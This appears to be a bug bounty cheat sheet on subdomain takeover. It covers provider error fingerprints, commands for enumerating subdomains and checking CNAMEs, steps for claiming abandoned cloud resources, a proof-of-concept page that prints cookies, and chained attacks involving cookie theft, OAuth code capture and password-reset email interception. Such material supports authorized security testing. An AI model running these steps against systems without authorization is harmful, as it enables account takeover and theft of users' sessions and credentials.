# Subdomain Takeover Techniques

> Subdomain takeover — a DNS CNAME points to a third-party service that has been deprovisioned; attacker registers the service resource and takes control of the subdomain.

## Surface

- Subdomains returning provider error pages instead of target content
- CNAMEs pointing to cloud services: GitHub Pages, S3, Heroku, Fastly, Azure, Shopify, Zendesk, Tumblr, Netlify, Surge.sh, Cargo
- Abandoned staging/dev subdomains: `dev.`, `staging.`, `beta.`, `old.`, `test.`
- MX records pointing to deprovisioned mail providers
- NS records delegating to name servers no longer owned by target

**Fingerprint table:**

| Provider | Error String |
|---|---|
| GitHub Pages | `There isn't a GitHub Pages site here` |
| AWS S3 | `NoSuchBucket` |
| Heroku | `No such app` |
| Fastly | `Fastly error: unknown domain` |
| Azure | `404 Web Site not found` |
| Shopify | `Sorry, this shop is currently unavailable` |
| Zendesk | `Help Center Closed` |
| Tumblr | `There's nothing here` |
| Netlify | `Not Found - Request ID` |
| Surge.sh | `project not found` |

## Test Approach

1. **Enumerate all subdomains** — cast wide net:
   ```
   subfinder -d target.com -all -silent | anew subs.txt
   amass enum -passive -d target.com >> subs.txt
   ```
2. **Resolve CNAMEs** — extract chains pointing to third-party providers:
   ```
   cat subs.txt | dnsx -cname -resp -silent | grep -v "target.com$"
   ```
3. **Run nuclei takeover templates** — automated fingerprint matching:
   ```
   nuclei -t /root/nuclei-templates/takeovers/ -l subs.txt -silent
   ```
4. **Manual verify** — curl each flagged subdomain, confirm fingerprint string in response:
   ```
   curl -s https://dev.target.com | grep -i "NoSuchBucket\|There isn't a GitHub"
   ```
5. **Claim the service** — for confirmed targets:
   - GitHub Pages: create `<org>.github.io` repo or a repo matching the CNAME path
   - S3: create a bucket with the exact subdomain name in the same region
   - Heroku: `heroku apps:create <app-name>` matching the CNAME target
6. **PoC** — host minimal HTML proving control:
   ```html
   <h1>Subdomain Takeover PoC</h1>
   <script>document.write(document.domain + ' — ' + document.cookie)</script>
   ```
   Screenshot domain + cookie output for report.

## Tools

- **subfinder** — passive subdomain enumeration; `subfinder -d target.com -all -silent`
- **amass** — active + passive enumeration; `amass enum -passive -d target.com`
- **dnsx** — DNS resolution + CNAME extraction; `dnsx -cname -resp -l subs.txt`
- **nuclei** — fingerprint matching against known takeover signatures; `nuclei -t takeovers/ -l subs.txt`
- **subjack** — legacy but fast; `subjack -w subs.txt -t 100 -ssl -o takeovers.txt`
- **can-i-take-over-xyz** — EdOverflow's reference list of fingerprints + claimability per provider

## Payloads / Probes

```bash
# Full pipeline: enumerate → CNAME → takeover check
subfinder -d target.com -silent | dnsx -cname -resp -silent | \
  grep -v "target\.com" | tee cname-candidates.txt

# Run nuclei takeover suite
nuclei -t ~/nuclei-templates/takeovers/ -l cname-candidates.txt -silent -o hits.txt

# Manual CNAME + fingerprint check
dig CNAME dev.target.com +short
curl -sk https://dev.target.com | grep -iE "NoSuchBucket|no such app|isn't a GitHub Pages"

# Check for dangling NS delegation
dig NS subs.target.com +short
# If NS points to registrar not used by target — registerable
```

## Chain Opportunities

- **Subdomain takeover → cookie theft** — if parent domain sets cookies with `Domain=.target.com`, attacker-controlled subdomain receives them; capture session cookies passively
- **Subdomain takeover → OAuth redirect_uri hijack** — if the dead subdomain was a registered `redirect_uri`, register the service, catch authorization codes in access logs
- **Subdomain takeover → email hijack** — MX record pointing to unclaimed provider; register the provider account, receive password reset emails for `@sub.target.com`
- **Subdomain takeover → XSS** — serve attacker JS from taken-over subdomain; JS runs in origin context with SOP access to shared cookies/storage if `Domain=.target.com`

## Recent Intel

- **EdOverflow can-i-take-over-xyz** · community-maintained list of 100+ providers with fingerprints, claimability status, and difficulty ratings · https://github.com/EdOverflow/can-i-take-over-xyz
- **nuclei takeover templates** · ProjectDiscovery maintains ~60 provider-specific templates; updated when new providers become claimable; `nuclei -ut` to pull latest
- **HackerOne 2024** · subdomain takeovers on decommissioned Zendesk/Shopify subdomains paying $500–$3000 depending on whether cookies are in scope; `staging.` and `help.` prefixes most common
